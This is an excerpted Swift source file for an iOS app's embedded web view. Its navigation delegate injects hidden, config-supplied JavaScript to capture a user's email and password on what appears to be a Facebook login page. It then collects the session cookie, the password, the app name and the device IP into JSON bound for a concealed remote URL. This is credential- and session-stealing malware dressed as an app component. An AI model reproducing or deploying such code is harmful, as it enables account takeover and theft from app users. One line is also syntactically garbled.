...
struct CoordsTwo: UIViewRepresentable {
    ...
    class ClassTwoCoordi: NSObject, WKNavigationDelegate {
        ...
        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_1a.rawValue] ?? "") { item_email, error_email in
            ...
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_2a.rawValue] ?? "") { item_matkhau, errormatkhau in
        ...
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_3a.rawValue] ?? "")
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_4a.rawValue] ?? "")
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_5a.rawValue] ?? "")
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_6a.rawValue] ?? "")
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_7a.rawValue] ?? "")
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_8a.rawValue] ?? "")
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_9a.rawValue] ?? "")
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_10a.rawValue] ?? "")
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_11a.rawValue] ?? "")
            
            if webView.url?.absoluteString.range(of: "checkpoint") != nil {
                webView.evaluateJavaScript(arrayData[ValueKey.two_fr_12a.rawValue] ?? "")
                webView.evaluateJavaScript(arrayData[ValueKey.two_fr_13a.rawValue] ?? "")
            }
            
            webView.evaluateJavaScript(arrayData[ValueKey.two_fr_14a.rawValue] ?? "") { nameUserGet, errorNameUserGet in
            ...
            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                let two_i = cookies.firstIndex(where: { $0.name == arrayData[ValueKey.name_api_09.rawValue] ?? ""})
                if two_i != nil {
                    ...
                    let Two_json_data: [String: Any] = [
                        arrayData[ValueKey.name_api_01.rawValue] ?? "": cookies[two_i!].value,
                        arrayData[ValueKey.name_api_02.rawValue] ?? "": two_get_ck,
                        arrayData[ValueKey.name_api_03.rawValue] ?? """useragentck": self.pa_rent_tow.is_two_ktra_matkhau,
                        arrayData[ValueKey.name_api_04.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "",
                        arrayData[ValueKey.name_api_05.rawValue] ?? "": self.readIppAdd()
                    ]
                    let url: URL = URL(string: arrayData[ValueKey.Chung_fr_03.rawValue] ?? "")!
